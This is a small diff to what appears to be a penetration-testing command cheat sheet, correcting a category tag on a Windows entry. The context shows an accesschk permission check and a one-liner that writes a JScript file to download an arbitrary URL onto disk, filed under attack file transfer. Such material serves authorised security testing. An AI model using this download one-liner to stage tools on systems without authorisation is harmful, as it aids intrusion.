@@ -190,7 +190,7 @@ accesschk.exe -uwqs Users <c>:\
 % windows, download
 
 ## VBS download file script
-#cat/ATTACK/FILE_TRANSFERT
+#cat/ATTACK/FILE_TRANSFER
 ```
 echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();WScript.Echo(WinHttpReq.ResponseText); > fu.js && cscript /nologo fu.js <file_url> > <downloaded_file>
 ```
